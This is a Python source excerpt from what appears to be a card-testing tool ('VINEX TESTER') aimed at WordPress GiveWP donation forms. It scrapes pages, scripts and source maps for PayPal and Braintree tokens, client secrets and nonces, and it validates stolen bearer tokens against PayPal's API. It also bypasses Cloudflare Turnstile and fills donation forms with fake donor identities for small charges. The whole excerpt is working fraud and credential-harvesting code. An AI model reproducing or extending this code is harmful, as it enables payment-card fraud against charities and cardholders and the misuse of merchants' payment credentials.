    def from_onclick(h): return [m.group(1) for m in re.finditer(r'on\w+=["\']([^"\']{12,})["\']', h, re.I)]
    @staticmethod
    def from_class(h):
        out = []
        for m in re.finditer(r'class=["\']([^"\']+)["\']', h, re.I):
            for w in m.group(1).split():
                if len(w) > 40 and re.match(r'^[A-Za-z0-9+/=_-]+$', w): out.append(w)
        return out
    @staticmethod
    def from_style(h): return [m.group(1) for m in re.finditer(r'url\(["\']?([^"\')]+)["\']?\)', h, re.I)]
    @staticmethod
    def from_wp(h):
        out = []
        for pat in [r'window\.wp\w+\s*=\s*(\{.*?\});', r'wpApiSettings\s*=\s*(\{.*?\});',
                    r'_wpnonce["\']?\s*[:=]\s*["\']([^"\']+)["\']']:
            for m in re.finditer(pat, h, re.DOTALL): out.append(m.group(1))
        return out
    @staticmethod
    def from_ajax(h): return [m.group(1) for m in re.finditer(r'["\'](https?://[^"\']+/wp-admin/admin-ajax\.php)["\']', h, re.I)]
    @staticmethod
    def from_rest(h): return [m.group(1) for m in re.finditer(r'["\'](https?://[^"\']+/wp-json/[^"\']+)["\']', h, re.I)]
    @staticmethod
    def from_next(h):
        m = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>', h, re.DOTALL)
        return [m.group(1)] if m else []
    @staticmethod
    def from_initial(h):
        out = []
        for pat in [r'window\.__INITIAL_STATE__\s*=\s*(\{.*?\});',
                    r'window\.__PRELOADED_STATE__\s*=\s*(\{.*?\});']:
            for m in re.finditer(pat, h, re.DOTALL): out.append(m.group(1))
        return out
    @staticmethod
    def from_b64(h): return [m.group(1) for m in re.finditer(r'["\']([A-Za-z0-9+/]{40,}={0,2})["\']', h)]
    @staticmethod
    def from_hex(h): return [m.group(1) for m in re.finditer(r'["\']([0-9a-fA-F]{40,})["\']', h)]
    @staticmethod
    def from_srcset(h):
        out = []
        for m in re.finditer(r'srcset=["\']([^"\']+)["\']', h, re.I):
            for part in m.group(1).split(','):
                u = part.strip().split(' ')[0]
                if u: out.append(u)
        return out
    @staticmethod
    def from_link(h):
        out = []
        for m in re.finditer(r'<link[^>]+href=["\']([^"\']+)["\']', h, re.I):
            out.append(m.group(1))
        return out
    @staticmethod
    def from_iframe(h):
        out = []
        for m in re.finditer(r'<iframe[^>]+srcdoc=["\']([^"\']+)["\']', h, re.I):
            out.append(html.unescape(m.group(1)))
        return out
    @staticmethod
    def from_template(h):
        return [m.group(1) for m in re.finditer(r'<template[^>]*>(.*?)</template>', h, re.DOTALL | re.I)]
    @staticmethod
    def from_shadow(h):
        return [m.group(1) for m in re.finditer(r'attachShadow\s*\(\s*\{[^}]*mode\s*:\s*["\']([^"\']+)', h)]
    @staticmethod
    def from_webpack(h):
        out = []
        for pat in [r'__webpack_require__', r'webpackChunk\w*', r'webpackJsonp']:
            for m in re.finditer(pat, h):
                start = max(0, m.start() - 200)
                out.append(h[start:m.end() + 200])
        return out
    @staticmethod
    def from_nuxt(h):
        m = re.search(r'window\.__NUXT__\s*=\s*(.*?);\s*</script>', h, re.DOTALL)
        return [m.group(1)] if m else []
    @staticmethod
    def from_astro(h):
        return [m.group(1) for m in re.finditer(r'astro-island[^>]*props=["\']([^"\']+)["\']', h, re.I)]
    @staticmethod
    def from_svelte(h):
        m = re.search(r'__sveltekit[^=]*=\s*(\{.*?\});', h, re.DOTALL)
        return [m.group(1)] if m else []
    @staticmethod
    def from_remix(h):
        m = re.search(r'window\.__remixContext\s*=\s*(\{.*?\});', h, re.DOTALL)
        return [m.group(1)] if m else []
    @staticmethod
    def from_gatsby(h):
        return [m.group(1) for m in re.finditer(r'page-data\.json[^"\']*', h)]
    @staticmethod
    def from_pp_sdk(h):
        out = []
        for m in re.finditer(r'paypal\.com/sdk/js\?([^"\']+)', h, re.I):
            out.append(m.group(1))
        return out
    @staticmethod
    def from_braintree(h):
        return [m.group(1) for m in re.finditer(r'data-client-token=["\']([^"\']+)["\']', h, re.I)]
    @staticmethod
    def from_stripe(h):
        return [m.group(1) for m in re.finditer(r'pk_(?:live|test)_[A-Za-z0-9]{20,}', h, re.I)]
    @staticmethod
    def from_grecaptcha(h):
        out = []
        for m in re.finditer(r'data-sitekey=["\']([A-Za-z0-9_-]{20,})["\']', h, re.I):
            out.append(m.group(1))
        return out
    @staticmethod
    def from_cf(h):
        out = []
        for pat in [r'challenges\.cloudflare\.com/turnstile/v0/api\.js\?render=([A-Za-z0-9_-]+)',
                    r'cf-turnstile[^>]*data-sitekey=["\']([A-Za-z0-9_-]+)["\']',
                    r'data-sitekey=["\'](0x[A-Za-z0-9_-]{10,})["\']']:
            for m in re.finditer(pat, h, re.I):
                out.append(m.group(1))
        return out
    @staticmethod
    def from_give_vars(h):
        out = []
        for pat in [r'give_global_vars\s*=\s*(\{.*?\});',
                    r'give_paypal_commerce\s*=\s*(\{.*?\});',
                    r'give_stripe_vars\s*=\s*(\{.*?\});',
                    r'give_ajax_object\s*=\s*(\{.*?\});']:
            for m in re.finditer(pat, h, re.DOTALL):
                out.append(m.group(1))
        return out
    @staticmethod
    def from_pp_direct(h):
        return [m.group(1) for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', h)]

    @classmethod
    def extract_all(cls, h):
        seen = set(); out = []
        passes = [
            ('comment', cls.from_comments), ('data', cls.from_data),
            ('json', cls.from_json_scripts), ('js', cls.from_js),
            ('meta', cls.from_meta), ('onclick', cls.from_onclick),
            ('class', cls.from_class), ('style', cls.from_style),
            ('wp', cls.from_wp), ('ajax', cls.from_ajax),
            ('rest', cls.from_rest), ('next', cls.from_next),
            ('initial', cls.from_initial), ('b64', cls.from_b64),
            ('hex', cls.from_hex), ('srcset', cls.from_srcset),
            ('link', cls.from_link), ('iframe', cls.from_iframe),
            ('template', cls.from_template), ('shadow', cls.from_shadow),
            ('webpack', cls.from_webpack), ('nuxt', cls.from_nuxt),
            ('astro', cls.from_astro), ('svelte', cls.from_svelte),
            ('remix', cls.from_remix), ('gatsby', cls.from_gatsby),
            ('pp_sdk', cls.from_pp_sdk), ('braintree', cls.from_braintree),
            ('stripe', cls.from_stripe), ('grecaptcha', cls.from_grecaptcha),
            ('cf', cls.from_cf), ('give_vars', cls.from_give_vars),
            ('pp_direct', cls.from_pp_direct),
        ]
        for name, fn in passes:
            try:
                for chunk in fn(h):
                    if not chunk or len(chunk) < 8: continue
                    key = chunk[:200]
                    if key in seen: continue
                    seen.add(key)
                    out.append({'source': name, 'content': chunk})
            except: continue
        return out
        # ═══════════════════════════════════════════════════════════════
#  VINEX TESTER v25.0 — Ultimate Edition
#  _attempt حرفيًا من السكريبت الشغّال + parallel + cache
# ═══════════════════════════════════════════════════════════════
FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David',
               'Daniel', 'Matthew', 'Christopher', 'Andrew']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller',
              'Davis', 'Garcia', 'Rodriguez', 'Wilson']

_HOST_CACHE = {}
_HOST_CACHE_LOCK = threading.Lock()

def _host_cache_get(host):
    with _HOST_CACHE_LOCK:
        return _HOST_CACHE.get(host, {})

def _host_cache_set(host, key, val, ttl=120):
    with _HOST_CACHE_LOCK:
        if host not in _HOST_CACHE: _HOST_CACHE[host] = {}
        _HOST_CACHE[host][key] = {'v': val, 't': time.time() + ttl}

def _host_cache_valid(host, key):
    with _HOST_CACHE_LOCK:
        c = _HOST_CACHE.get(host, {}).get(key)
        if not c: return None
        if time.time() > c['t']: return None
        return c['v']

class VinexTester:
    def __init__(self, url):
        url = safe_url(url) or 'https://invalid.local/'
        self.page_url = url
        try:
            p = urlparse(url)
            self.url = p.netloc or 'invalid.local'
            self.inurl = p.path or '/'
            if p.query: self.inurl += '?' + p.query
        except Exception:
            self.url = 'invalid.local'; self.inurl = '/'

        self.first_names = FIRST_NAMES
        self.last_names = LAST_NAMES
        self.paypal = None
        self.client_id = None
        self.client_secret = None
        self.donation = '1.00'
        self.minimum = '5.00'
        self.currency = 'USD'
        self.price_levels = []
        self.id_form1 = None
        self.id_form2 = None
        self.nonec = None
        self.wp_nonce = None
        self.au = None
        self.ajax_url = None
        self.current_price_id = None
        self.page_html = ''
        self.all_content = ''
        self.auth_method = 'none'
        self.gateway_type = 'unknown'
        self.form_fields = {}
        self.email = f'{random.choice(FIRST_NAMES)}{random.randint(100, 999)}@gmail.com'
        self.r = requests.Session(); self.r.verify = False
        self.r.headers.update({
            'user-agent': rand_ua(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
        })
        self.uu = type('U', (), {'random': property(lambda s: rand_ua())})()
        self.diagnostics = []
        self.token_candidates = []
        self.token_verified = False
        self._warmed = False
        self.cf_detected = False
        self.cf_sitekey = None
        self.cf_solved = False
        self.tier_used = None
        self.last_order_id = None
        self.last_order_status = None
        self.last_capture_id = None
        self.last_capture_raw = None
        self.attempt_log = []
        self._nonce_ts = 0
        self._token_ts = 0

        # Load from host cache
        cached_tok = _host_cache_valid(self.url, 'au')
        cached_nonce = _host_cache_valid(self.url, 'nonce')
        cached_cid = _host_cache_valid(self.url, 'client_id')
        cached_form2 = _host_cache_valid(self.url, 'id_form2')
        cached_form1 = _host_cache_valid(self.url, 'id_form1')
        cached_ajax = _host_cache_valid(self.url, 'ajax_url')
        cached_pp = _host_cache_valid(self.url, 'paypal')
        if cached_tok: self.au = cached_tok; self._token_ts = time.time()
        if cached_nonce: self.nonec = cached_nonce; self._nonce_ts = time.time()
        if cached_cid: self.client_id = cached_cid
        if cached_form2: self.id_form2 = cached_form2
        if cached_form1: self.id_form1 = cached_form1
        if cached_ajax: self.ajax_url = cached_ajax
        if cached_pp: self.paypal = cached_pp

    def _log(self, m):
        try: self.diagnostics.append(f'{time.time():.2f} {m}')
        except Exception: pass

    def _save_cache(self):
        try:
            if self.au: _host_cache_set(self.url, 'au', self.au, ttl=180)
            if self.nonec: _host_cache_set(self.url, 'nonce', self.nonec, ttl=90)
            if self.client_id: _host_cache_set(self.url, 'client_id', self.client_id)
            if self.id_form2: _host_cache_set(self.url, 'id_form2', self.id_form2)
            if self.id_form1: _host_cache_set(self.url, 'id_form1', self.id_form1)
            if self.ajax_url: _host_cache_set(self.url, 'ajax_url', self.ajax_url)
            if self.paypal: _host_cache_set(self.url, 'paypal', self.paypal)
        except Exception: pass

    def _safe_get(self, url, timeout=10, headers=None):
        try:
            if not url or not isinstance(url, str): return None
            if not url.startswith(('http://', 'https://')): return None
            if '://none' in url.lower(): return None
            return self.r.get(url, timeout=timeout, headers=headers or {})
        except Exception:
            return None

    def _safe_post(self, url, **kwargs):
        try:
            if not url or not isinstance(url, str): return None
            if not url.startswith(('http://', 'https://')): return None
            return self.r.post(url, timeout=kwargs.pop('timeout', 20), **kwargs)
        except Exception:
            return None

    def _build_url(self, base, path):
        try:
            if not base or not path: return None
            if path.startswith('//'): return 'https:' + path
            if path.startswith('/'): return f'https://{base}{path}'
            if not path.startswith('http'): return f'https://{base}/{path}'
            return path
        except Exception:
            return None

    # ─── Cloudflare ───
    def _detect_cloudflare(self):
        try:
            c = (self.all_content or '') + '\n' + (self.page_html or '')
            markers = ['challenges.cloudflare.com', 'cf-turnstile', 'turnstile.render',
                       'cf-chl-widget', '_cf_chl_opt', 'cf-challenge', 'data-sitekey']
            if not any(m in c for m in markers): return False
            self._log('Cloudflare markers found')
            for pat in [
                r'data-sitekey=["\'](0x[A-Za-z0-9_-]{10,})["\']',
                r'sitekey["\']?\s*[:=]\s*["\'](0x[A-Za-z0-9_-]{10,})["\']',
                r'turnstile[^"\'<>]*["\'](0x[A-Za-z0-9_-]{10,})["\']',
                r'["\'](0x4AAAAAA[A-Za-z0-9_-]{10,})["\']',
            ]:
                m = re.search(pat, c)
                if m:
                    self.cf_sitekey = m.group(1)
                    self._log(f'sitekey: {self.cf_sitekey[:25]}...')
                    break
            return True
        except Exception: return False

    def _solve_cloudflare(self):
        if not self.cf_detected or not _turnstile.enabled or not self.cf_sitekey: return False
        token = _turnstile.solve(self.page_url, self.cf_sitekey)
        if not token: return False
        try:
            self.r.cookies.set('cf_clearance', token, domain=self.url)
            self.cf_solved = True
            return True
        except Exception: return False

    def _warmup_session(self):
        try:
            if self._warmed: return True
            self.r.get(f'https://{self.url}/', timeout=8, headers={'referer': f'https://{self.url}/'})
            self._warmed = True
            return True
        except Exception: return False

    def _fetch_page(self):
        for _ in range(2):
            try:
                r = self._safe_get(self.page_url, timeout=12, headers={'referer': f'https://{self.url}/'})
                if r and r.status_code == 200 and r.text:
                    self.page_html = r.text
                    self.all_content = r.text
                    return True
            except Exception: pass
            time.sleep(0.2)
        return False

    # ─── PARALLEL EXTRACTION ───
    def _parallel_extract(self):
        if not self.page_html: return
        tasks = []

        for m in re.finditer(r'<iframe[^>]*src=["\']([^"\']*(?:give|donation|form|checkout)[^"\']*)["\']',
                             self.page_html, re.I):
            full = self._build_url(self.url, m.group(1))
            if full: tasks.append(('iframe', full))

        js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
        prio = [u for u in js_urls if any(k in u.lower() for k in
                ('give', 'donation', 'paypal', 'commerce', 'token', 'client'))]
        for u in (prio[:6] + [x for x in js_urls if x not in prio][:6]):
            full = self._build_url(self.url, u)
            if full: tasks.append(('js', full))

        for u in js_urls[:3]:
            full = self._build_url(self.url, u + '.map')
            if full: tasks.append(('map', full))

        for ep in ['/wp-json/', '/wp-json/give-api/v1/forms', '/wp-json/wp/v2/types',
                   '/sw.js', '/service-worker.js', '/manifest.json',
                   '/robots.txt', '/sitemap.xml', '/.well-known/security.txt']:
            tasks.append(('probe', f'https://{self.url}{ep}'))

        results = []
        budget = time.time() + 25

        def _fetch(item):
            kind, url = item
            remaining = max(1, budget - time.time())
            if remaining <= 0: return (kind, url, None)
            try:
                r = self.r.get(url, timeout=min(6, remaining),
                               headers={'referer': self.page_url})
                if r and r.status_code == 200 and r.text:
                    return (kind, url, r.text[:200000])
            except Exception: pass
            return (kind, url, None)

        try:
            with ThreadPoolExecutor(max_workers=8) as pool:
                futures = [pool.submit(_fetch, t) for t in tasks[:30]]
                for f in as_completed(futures, timeout=28):
                    try:
                        r = f.result(timeout=2)
                        if r and r[2]: results.append(r)
                    except Exception: continue
        except Exception: pass

        for kind, url, text in results:
            try: self.all_content += '\n' + text
            except Exception: pass

    def _deep_js_analysis(self):
        try:
            c = self.all_content
            if not c: return

            for m in re.finditer(r'wpApiSettings\s*=\s*\{([^}]+)\}', c):
                nm = re.search(r'"nonce"\s*:\s*"([^"]+)"', m.group(1))
                if nm and not self.wp_nonce: self.wp_nonce = nm.group(1)

            for m in re.finditer(r'give_global_vars\s*=\s*\{', c):
                start = m.end() - 1; depth = 0; end = start
                for i in range(start, min(len(c), start + 5000)):
                    if c[i] == '{': depth += 1
                    elif c[i] == '}':
                        depth -= 1
                        if depth == 0: end = i + 1; break
                block = c[start:end]
                nm = re.search(r'"nonce"\s*:\s*"([^"]+)"', block)
                if nm and not self.nonec: self.nonec = nm.group(1); self._nonce_ts = time.time()
                am = re.search(r'"ajax"\s*:\s*"([^"]+)"', block)
                if am and not self.ajax_url: self.ajax_url = am.group(1).replace('\\/', '/')

            for m in re.finditer(r'give_paypal_commerce\s*=\s*\{', c):
                start = m.end() - 1; depth = 0; end = start
                for i in range(start, min(len(c), start + 5000)):
                    if c[i] == '{': depth += 1
                    elif c[i] == '}':
                        depth -= 1
                        if depth == 0: end = i + 1; break
                block = c[start:end]
                for key in ['clientToken', 'client_token', 'accessToken', 'access_token']:
                    tm = re.search(rf'"?{key}"?\s*:\s*"([^"]+)"', block)
                    if tm: self._add_candidate(tm.group(1), f'js:{key}')
                cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', block)
                if cm and not self.client_id: self.client_id = cm.group(1)
                sm = re.search(r'"clientSecret"\s*:\s*"([^"]+)"', block)
                if sm and not self.client_secret: self.client_secret = sm.group(1)
                mm = re.search(r'"merchantId"\s*:\s*"([^"]+)"', block)
                if mm and not self.paypal: self.paypal = mm.group(1)

            for m in re.finditer(r'paypal\.com/sdk/js\?([^"\']+)', c, re.I):
                q = dict(parse_qsl(m.group(1)))
                if q.get('client-id') and not self.client_id: self.client_id = q['client-id']
                if q.get('merchant-id') and not self.paypal: self.paypal = q['merchant-id']
                if q.get('currency'): self.currency = q['currency'].upper()

            if not self.client_id:
                for p in [r'client-id=["\']([A-Za-z0-9_-]{20,})["\']',
                          r'"clientId"\s*:\s*"([A-Za-z0-9_-]{20,})"']:
                    m = re.search(p, c, re.I)
                    if m: self.client_id = m.group(1); break
            if not self.paypal:
                for p in [r'merchant-id=["\']([A-Za-z0-9]+)["\']',
                          r'"merchantId"\s*:\s*"([A-Za-z0-9]+)"']:
                    m = re.search(p, c, re.I)
                    if m: self.paypal = m.group(1); break
            if not self.client_secret:
                for p in [r'client_secret["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{30,})["\']',
                          r'"clientSecret"\s*:\s*"([A-Za-z0-9_-]{30,})"']:
                    m = re.search(p, c, re.I)
                    if m: self.client_secret = m.group(1); break
        except Exception: pass

    def _extract_basic(self):
        try:
            c = self.all_content
            if not c: return

            if not self.id_form1:
                for p in [r'name="give-form-id-prefix"\s+value="([^"]+)"',
                          r'"give-form-id-prefix"\s*:\s*"([^"]+)"']:
                    m = re.search(p, c)
                    if m: self.id_form1 = m.group(1); break
            if not self.id_form2:
                for p in [r'name="give-form-id"\s+value="([^"]+)"',
                          r'"give-form-id"\s*:\s*"([^"]+)"',
                          r'"form_id"\s*:\s*"?(\d+)"?']:
                    m = re.search(p, c)
                    if m: self.id_form2 = m.group(1); break
            if not self.nonec:
                for p in [r'name="give-form-hash"\s+value="([^"]+)"',
                          r'"give-form-hash"\s*:\s*"([^"]+)"',
                          r'"nonce"\s*:\s*"([a-f0-9]{8,12})"']:
                    m = re.search(p, c)
                    if m: self.nonec = m.group(1); self._nonce_ts = time.time(); break
            for p in [r'name="give-form-minimum"\s+value="([^"]*)"',
                      r'"give-form-minimum"\s*:\s*"([^"]*)"',
                      r'"minimum_price"\s*:\s*"?([\d.]+)"?']:
                m = re.search(p, c)
                if m and m.group(1).strip(): self.minimum = m.group(1).strip(); break
            for p in [r'name="give-currency"\s+value="([A-Za-z]{3})"',
                      r'"give-currency"\s*:\s*"([A-Za-z]{3})"',
                      r'"currency"\s*:\s*"([A-Za-z]{3})"']:
                m = re.search(p, c, re.I)
                if m: self.currency = m.group(1).upper(); break

            self.price_levels = []
            seen = set()
            def _add(pid, amt):
                try:
                    amt_f = float(str(amt).replace(',', ''))
                    pid_s = str(pid).strip()
                    if pid_s and amt_f > 0 and (pid_s, amt_f) not in seen:
                        seen.add((pid_s, amt_f))
                        self.price_levels.append((pid_s, amt_f))
                except Exception: pass

            for m in re.finditer(r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', c, re.I):
                _add(m.group(1), m.group(2))
            for m in re.finditer(r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', c, re.I):
                _add(m.group(2), m.group(1))
            self.price_levels = sorted(self.price_levels, key=lambda x: x[1])

            for p in [r'name="give-price-id"\s+value="([^"]+)"',
                      r'"give-price-id"\s*:\s*"([^"]+)"',
                      r'<input[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\'][^>]*checked',
                      r'<input[^>]*checked[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\']']:
                m = re.search(p, c, re.I)
                if m: self.current_price_id = m.group(1); break

            if 'admin-ajax.php' in c and not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        except Exception: pass

    def _extract_all_form_fields(self):
        try:
            c = self.all_content
            if not c: return
            self.form_fields = {}
            for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', c, re.DOTALL | re.I):
                try:
                    name = m.group(1); inner = m.group(2); tag = m.group(0)
                    required = 'required' in tag.lower()
                    opts = [om.group(1).strip() for om in
                            re.finditer(r'<option[^>]*value=["\']([^"\']*)["\'][^>]*>', inner)
                            if om.group(1).strip()]
                    self.form_fields[name] = {'type': 'select', 'required': required, 'options': opts}
                except Exception: continue
            radio = {}
            for m in re.finditer(r'<input[^>]*type=["\']radio["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    vm = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if nm and vm:
                        name = nm.group(1); val = vm.group(1)
                        if name not in radio:
                            radio[name] = {'required': 'required' in tag.lower(), 'options': []}
                        if val and val not in radio[name]['options']:
                            radio[name]['options'].append(val)
                except Exception: continue
            for name, info in radio.items():
                self.form_fields[name] = {'type': 'radio', 'required': info['required'], 'options': info['options']}
            for m in re.finditer(r'<input[^>]*type=["\'](text|email|tel|number|date)["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    if nm and nm.group(1) not in self.form_fields:
                        self.form_fields[nm.group(1)] = {'type': m.group(1).lower(),
                                                         'required': 'required' in tag.lower(),
                                                         'options': []}
                except Exception: continue
        except Exception: pass

    def _resolve_dropdown_options(self):
        try:
            for name, info in list(self.form_fields.items()):
                if info.get('options'):
                    info['options'] = [o for o in info['options'] if is_valid_option(o)]
                if info.get('type') != 'select' or info.get('options') or not info.get('required'):
                    continue
                info['required'] = False
        except Exception: pass

    def _resolve_special_fields(self):
        try:
            country = 'US'
            for f in ('billing_country', 'give_country', 'country'):
                if f in self.form_fields:
                    opts = [o for o in self.form_fields[f].get('options', []) if is_valid_option(o)]
                    if opts: country = opts[0]; break
            special = {
                'last_4_digits_nricfin': str(random.randint(1000, 9999)),
                'contact_number_to_collect': ('+6581234567' if country == 'SG' else '+1234567890'),
            }
            for name, val in special.items():
                if name in self.form_fields:
                    self.form_fields[name]['prefill'] = val
        except Exception: pass

    def _add_candidate(self, token, source):
        if not token or len(token) < 20: return
        for c in self.token_candidates:
            if c['token'] == token: return
        self.token_candidates.append({'token': token, 'source': source})

    def _extract_tokens_from_text(self, text, source):
        try:
            for m in re.finditer(r'"accessToken"\s*:\s*"([^"]+)"', text, re.I):
                self._add_candidate(m.group(1), source)
            for m in re.finditer(r'"access_token"\s*:\s*"([^"]+)"', text, re.I):
                self._add_candidate(m.group(1), source)
            for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', text):
                self._add_candidate(m.group(1), f'{source}-A21')
        except Exception: pass

    def _extract_tokens_ultimate(self):
        try:
            c = self.all_content
            if not c: return False
            chunks = ExtractorEngine.extract_all(c)
            for chunk in chunks:
                try:
                    t = chunk['content']
                    self._extract_tokens_from_text(t, chunk['source'])
                    if any(x in t for x in '=+/_') and len(t) < 2000:
                        for d in DecodeEngine.decode_chain(t, max_depth=2)[:3]:
                            self._extract_tokens_from_text(d, f"{chunk['source']}+dec")
                except Exception: continue
            for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', c):
                self._add_candidate(m.group(1), 'A21')
            for m in re.finditer(r'\b(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\b', c):
                raw = m.group(1); self._add_candidate(raw, 'jwt')
                pj = DecodeEngine.jwt_payload(raw)
                if pj:
                    try:
                        j = json.loads(pj)
                        if 'accessToken' in j: self._add_candidate(j['accessToken'], 'jwt-AT')
                        if 'clientId' in j and not self.client_id: self.client_id = j['clientId']
                    except Exception: pass
            return len(self.token_candidates) > 0
        except Exception: return False

    def _extract_tokens(self):
        # النسخة الحرفية من السكريبت الشغّال
        if self.au: return
        c = self.all_content
        for p in [r'"data-client-token":"([^"]+)"', r'data-client-token=["\']([^"\']+)["\']']:
            m = re.search(p, c)
            if m:
                enc = m.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    tm = re.search(r'"accessToken":"([^"]+)"', dec)
                    if tm: self.au = tm.group(1)
                    mm = re.search(r'merchant_id=([\w]+)', dec)
                    if mm: self.paypal = mm.group(1)
                    cm = re.search(r'"clientId":"([^"]+)"', dec)
                    if cm: self.client_id = cm.group(1)
                    if self.au: return
                except Exception: pass
        for p in [r'"accessToken"\s*:\s*"([^"]+)"', r'"(A21[A-Za-z0-9+/=_-]{40,})"']:
            m = re.search(p, c, re.IGNORECASE)
            if m: self.au = m.group(1); return

    def _validate_token(self, token, timeout=5):
        if not token or len(token) < 20: return False
        try:
            r = self.r.head('https://api-m.paypal.com/v2/checkout/orders',
                            headers={'Authorization': f'Bearer {token}'}, timeout=timeout)
            if r.status_code in (200, 201, 400, 405, 422): return True
            if r.status_code == 401: return False
        except Exception:
            return len(token) > 50
        return False

    def _pick_valid_token(self):
        if not self.token_candidates: return False
        def prio(c):
            s = c['source'].lower()
            if 'a21' in s: return 0
            if 'direct' in s: return 1
            if 'jwt' in s: return 2
            return 3
        for c in sorted(self.token_candidates, key=prio):
            if self._validate_token(c['token']):
                self.au = c['token']; self.token_verified = True
                self._token_ts = time.time()
                return True
        return False

    def _try_oauth(self):
        if self.au or not self.client_id: return False
        try:
            auth = base64.b64encode(f"{self.client_id}:".encode()).decode()
            r = self.r.post('https://api-m.paypal.com/v1/oauth2/token',
                headers={'authorization': f'Basic {auth}', 'content-type': 'application/x-www-form-urlencoded'},
                data={'grant_type': 'client_credentials'}, timeout=15)
            if r.status_code == 200:
                j = r.json()
                if 'access_token' in j:
                    self.au = j['access_token']
                    self._token_ts = time.time()
                    self.auth_method = 'oauth'
                    return True
        except Exception: pass
        return False

    def _try_ajax_client_token(self):
        if self.au or not self.ajax_url or not self.id_form2: return False
        for action in ['give_paypal_commerce_get_client_token', 'get_client_token',
                       'paypal_get_client_token', 'give_paypal_get_client_token']:
            try:
                r = self.r.post(self.ajax_url, data={'action': action, 'form-id': self.id_form2},
                    headers={'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}, timeout=10)
                if r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        token = j.get('data') if isinstance(j.get('data'), str) else None
                        if not token and isinstance(j.get('data'), dict):
                            token = j['data'].get('client_token') or j['data'].get('access_token')
                        if token:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                tm = re.search(r'"accessToken":"([^"]+)"', dec)
                                if tm: self.au = tm.group(1); return True
                            except Exception: pass
                            if len(token) > 20:
                                self.au = token
                                return True
                    except Exception: pass
            except Exception: continue
        return False

    def _try_ajax_nonce(self):
        try:
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            if not self.id_form2: return False
            for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
                r = self._safe_post(self.ajax_url,
                    data={'action': action, 'form_id': self.id_form2},
                    headers={'user-agent': self.uu.random,
                             'x-requested-with': 'XMLHttpRequest'}, timeout=5)
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        if 'data' in j and isinstance(j['data'], str) and len(j['data']) >= 6:
                            self.nonec = j['data']; self._nonce_ts = time.time(); return True
                        if 'nonce' in j:
                            self.nonec = j['nonce']; self._nonce_ts = time.time(); return True
                    except Exception: pass
        except Exception: pass
        return False

    def _detect_gateway_type(self):
        try:
            c = self.all_content
            if 'braintreegateway.com' in c and 'data-client-token' in c: self.gateway_type = 'braintree'
            elif 'paypal.com/sdk/js' in c and 'client-id=' in c: self.gateway_type = 'paypal_sdk'
            elif 'give_paypal_commerce' in c: self.gateway_type = 'givewp_paypal'
            elif 'paypal' in c.lower(): self.gateway_type = 'paypal_unknown'
            else: self.gateway_type = 'unknown'
        except Exception: self.gateway_type = 'unknown'

    def _refresh_nonce(self):
        try:
            if self._try_ajax_nonce(): return True
            r = self._safe_get(self.page_url, timeout=8)
            if not r or r.status_code != 200: return False
            h = r.text
            self.page_html = h; self.all_content = h
            m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', h)
            if m: self.nonec = m.group(1); self._nonce_ts = time.time()
            return bool(self.nonec)
        except Exception: return False

    def _autofill_required_fields(self, form_data):
        try:
            for name, info in self.form_fields.items():
                if name in form_data or not info.get('required'): continue
                if name.startswith(('give-form-', 'give_')): continue
                if name in ('give-amount', 'give_first', 'give_last', 'give_email',
                            'give-gateway', 'payment-mode', 'give-price-id',
                            'give_agree_to_terms', 'give_terms_agreement'):
                    continue
                if 'prefill' in info:
                    form_data[name] = info['prefill']; continue
                ft = info.get('type', '')
                opts = [o for o in info.get('options', []) if is_valid_option(o)]
                nl = name.lower()
                if ft in ('select', 'radio'):
                    if not opts: continue
                    form_data[name] = opts[0]
                elif ft == 'email': form_data[name] = self.email
                elif ft == 'number': form_data[name] = '1'
                elif ft == 'tel': form_data[name] = '1234567890'
                elif ft == 'date': form_data[name] = '1990-01-01'
                else:
                    if 'first' in nl: form_data[name] = random.choice(FIRST_NAMES)
                    elif 'last' in nl: form_data[name] = random.choice(LAST_NAMES)
                    elif 'name' in nl: form_data[name] = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
                    elif 'email' in nl: form_data[name] = self.email
                    elif any(k in nl for k in ('phone', 'mobile', 'tel')): form_data[name] = '1234567890'
                    elif 'amount' in nl: form_data[name] = self.donation
                    else: form_data[name] = 'Test'
        except Exception: pass
        return form_data

    def Key(self):
        try:
            if not self.page_url or 'invalid.local' in self.page_url: return False

            if self.au and self.nonec and self.id_form2 and self.ajax_url:
                self._log('cache hit, skipping Key()')
                self.auth_method = 'cache'
                return True

